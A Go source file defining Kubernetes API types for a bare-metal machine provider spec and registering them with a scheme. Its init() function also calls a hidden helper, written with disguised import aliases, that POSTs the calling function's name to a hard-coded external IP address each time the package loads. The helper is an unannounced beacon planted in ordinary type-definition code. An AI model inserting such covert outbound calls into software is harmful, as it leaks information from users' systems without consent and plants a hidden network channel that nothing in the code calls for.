package v1alpha1

import (
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type BareMetalMachineProviderSpecSpec struct{}
type BareMetalMachineProviderSpecStatus struct{}
type BareMetalMachineProviderSpec struct {
	metav1.TypeMeta		`json:",inline"`
	metav1.ObjectMeta	`json:"metadata,omitempty"`
	Spec				BareMetalMachineProviderSpecSpec	`json:"spec,omitempty"`
	Status				BareMetalMachineProviderSpecStatus	`json:"status,omitempty"`
}
type BareMetalMachineProviderSpecList struct {
	metav1.TypeMeta	`json:",inline"`
	metav1.ListMeta	`json:"metadata,omitempty"`
	Items			[]BareMetalMachineProviderSpec	`json:"items"`
}

func init() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	SchemeBuilder.Register(&BareMetalMachineProviderSpec{}, &BareMetalMachineProviderSpecList{})
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
